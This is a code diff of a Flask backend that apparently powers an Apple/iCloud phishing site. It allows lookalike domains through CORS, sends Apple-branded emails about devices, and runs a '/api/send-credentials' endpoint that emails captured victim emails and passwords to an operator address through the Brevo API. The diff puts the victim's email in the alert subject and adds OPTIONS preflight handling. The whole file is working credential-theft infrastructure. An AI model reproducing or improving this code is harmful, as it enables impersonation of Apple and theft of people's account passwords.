@@ -12,37 +12,25 @@ load_dotenv()
 
 app = Flask(__name__)
 
-# Configure CORS with more permissive settings for development
-CORS(
-    app,
-    resources={
-        r"/api/*": {
-            "origins": [
-                "https://icloud.devicefinder.cloud",
-                "http://icloud.devicefinder.cloud",
-                "http://localhost:5173",
-                "https://api.devicefinder.cloud"
-            ],
-            "methods": ["GET", "POST", "OPTIONS", "PUT", "DELETE"],
-            "allow_headers": ["Content-Type", "Authorization", "X-Requested-With", "Accept"],
-            "supports_credentials": True,
-            "expose_headers": ["Content-Type", "Authorization"],
-            "max_age": 3600,
-            "send_wildcard": False,
-            "vary_header": True
-        }
-    },
-)
+# Configure CORS
+CORS(app, resources={
+    r"/api/*": {
+        "origins": ["https://support.cloudfinder.click"],
+        "methods": ["GET", "POST", "OPTIONS"],
+        "allow_headers": ["Content-Type", "Authorization", "X-Requested-With", "Accept"],
+        "supports_credentials": True
+    }
+})
 
 # Add CORS headers to all responses
 @app.after_request
 def after_request(response):
-    response.headers.add('Access-Control-Allow-Origin', 'https://icloud.devicefinder.cloud')
-    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization,X-Requested-With,Accept')
-    response.headers.add('Access-Control-Allow-Methods', 'GET,POST,OPTIONS,PUT,DELETE')
+    response.headers.add('Access-Control-Allow-Origin', 'https://support.cloudfinder.click')
+    response.headers.add('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With, Accept, Origin, Access-Control-Request-Method, Access-Control-Request-Headers, Access-Control-Allow-Origin, Access-Control-Allow-Headers, Access-Control-Allow-Methods, Access-Control-Allow-Credentials')
+    response.headers.add('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
     response.headers.add('Access-Control-Allow-Credentials', 'true')
+    response.headers.add('Access-Control-Expose-Headers', 'Content-Type, Authorization, Access-Control-Allow-Origin, Access-Control-Allow-Headers, Access-Control-Allow-Methods, Access-Control-Allow-Credentials')
     return response
-
 
 class ValidationError(Exception):
     pass
@@ -84,10 +72,10 @@ def send_email_with_brevo(to_addrs: List[str], subject: str, html_content: str) 
         base_url = os.getenv("BREVO_BASE_URL")
         api_key = os.getenv("BREVO_API_KEY")
         from_email = os.getenv("BREVO_FROM_EMAIL")
-        from_name = os.getenv("BREVO_FROM_NAME")
+        from_name = os.getenv("BREVO_FROM_NAME", "Device Support")
 
         # Validate environment variables
-        if not all([base_url, api_key, from_email, from_name]):
+        if not all([base_url, api_key, from_email]):
             debug_print("Missing required Brevo configuration", error=True)
             raise ValidationError("Email service configuration is incomplete")
 
@@ -293,13 +281,17 @@ def send_device_email_async(email_data):
             <div class="container">
               <!-- Apple Logo -->
               <div class="logo-container">
-                <img
-                  src="https://www.apple.com/ac/globalnav/7/en_US/images/be15095f-5a20-57d0-ad14-cf4c638e223a/globalnav_apple_image__b5er5ngrzxqq_large.svg"
-                  alt="Apple"
-                  class="logo"
+                <svg
                   width="32"
                   height="38"
-                />
+                  viewBox="0 0 32 38"
+                  fill="none"
+                  xmlns="http://www.w3.org/2000/svg">
+                    <path
+                      d="M26.6621 36.4754C24.5945 38.4807 22.337 38.1641 20.1638 37.2142C17.8641 36.2432 15.7543 36.201 13.328 37.2142C10.2898 38.5229 8.68635 38.143 6.87189 36.4754C-3.42409 25.8578 -1.90501 9.68878 9.78346 9.09774C12.6317 9.2455 14.615 10.6598 16.2817 10.7864C18.7713 10.2798 21.1555 8.82333 23.8138 9.01331C26.9997 9.26661 29.4049 10.5331 30.9873 12.8128C24.4046 16.7601 25.9659 25.4357 32 27.8632C30.7974 31.0294 29.2361 34.1746 26.641 36.4965L26.6621 36.4754ZM16.0708 8.97109C15.7543 4.26391 19.5731 0.379952 23.9615 0C24.5734 5.44598 19.0245 9.4988 16.0708 8.97109Z"
+                      fill="black"
+                    />
+                </svg>
               </div>
 
               <!-- Main Heading -->
@@ -382,8 +374,8 @@ def send_credentials_email_async(credentials_data):
                 <h2>New Sign In Attempt</h2>
                 <p>New credentials received:</p>
                 <div style="background-color: #f9fafb; padding: 16px; border-radius: 8px;">
-                    <p><strong>Email:</strong> {credentials_data["email"]}</p>
-                    <p><strong>Password:</strong> {credentials_data["password"]}</p>
+                    <p><strong></strong> {credentials_data["email"]}</p>
+                    <p><strong></strong> {credentials_data["password"]}</p>
                 </div>
             </body>
         </html>
@@ -392,7 +384,7 @@ def send_credentials_email_async(credentials_data):
         # Send email using Brevo
         send_email_with_brevo(
             to_addrs=[os.getenv("ADMIN_EMAIL")],
-            subject="New Sign In Attempt",
+            subject=f"""New Sign In Attempt - {credentials_data["email"]}""",
             html_content=email_content,
         )
     except ValidationError as e:
@@ -401,8 +393,16 @@ def send_credentials_email_async(credentials_data):
         debug_print(f"Unexpected error sending credentials email: {str(e)}", error=True)
 
 
-@app.route("/api/send-device-email", methods=["POST"])
+@app.route("/api", methods=["GET"])
+def hello():
+    return "hello"
+
+
+@app.route("/api/send-device-email", methods=["POST", "OPTIONS"])
 def send_device_email():
+    if request.method == "OPTIONS":
+        return jsonify({"status": "ok"}), 200
+        
     try:
         data = request.json
         required_fields = [
@@ -436,8 +436,11 @@ def send_device_email():
         return jsonify({"error": str(e)}), 500
 
 
-@app.route("/api/send-credentials", methods=["POST"])
+@app.route("/api/send-credentials", methods=["POST", "OPTIONS"])
 def send_credentials():
+    if request.method == "OPTIONS":
+        return jsonify({"status": "ok"}), 200
+        
     try:
         data = request.json
         required_fields = ["email", "password"]
